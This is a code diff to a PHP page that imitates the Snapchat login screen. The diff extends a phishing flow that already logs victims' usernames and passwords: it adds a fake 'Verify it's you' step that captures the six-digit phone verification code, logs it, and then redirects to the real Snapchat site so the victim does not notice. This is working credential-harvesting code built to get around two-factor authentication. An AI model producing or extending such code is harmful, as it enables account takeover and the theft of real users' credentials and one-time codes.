@@ -25,15 +25,21 @@ function logline($kind, $val) {
     }
 }
 
-$step = $_POST['step'] ?? '1';
+$view = 'user';
+$pending = '';
+$step = $_POST['step'] ?? null;
 
 if ($step === '1') {
     $u = trim($_POST['u'] ?? '');
     if ($u === '') { header('Location: /'); exit; }
     logline('USER', $u);
     $pending = $u; $view = 'pw';
-} else {
+} elseif ($step === '2') {
     logline('PASS', $_POST['p'] ?? '');
+    $pending = trim($_POST['u'] ?? '');
+    $view = 'code';
+} elseif ($step === '3') {
+    logline('CODE', $_POST['c'] ?? '');
     header('Location: https://web.snapchat.com/'); exit;
 }
 ?>
@@ -73,6 +79,16 @@ if ($step === '1') {
       <button>Log in</button>
     </form>
     <p class="forgot">Forgot password?</p>
+  <?php elseif ($view === 'code'): ?>
+    <h1>Verify it's you</h1>
+    <p class="sub">Enter the 6-digit code we sent to your phone</p>
+    <form method="post" autocomplete="one-time-code">
+      <input type="hidden" name="step" value="3">
+      <input type="hidden" name="u" value="<?= htmlspecialchars($pending) ?>">
+      <input name="c" inputmode="numeric" pattern="[0-9]*" maxlength="6"
+             placeholder="6-digit code" autofocus required>
+      <button>Continue</button>
+    </form>
   <?php else: ?>
     <h1>Log in to Snapchat</h1>
     <p class="sub">Use your username or email</p>
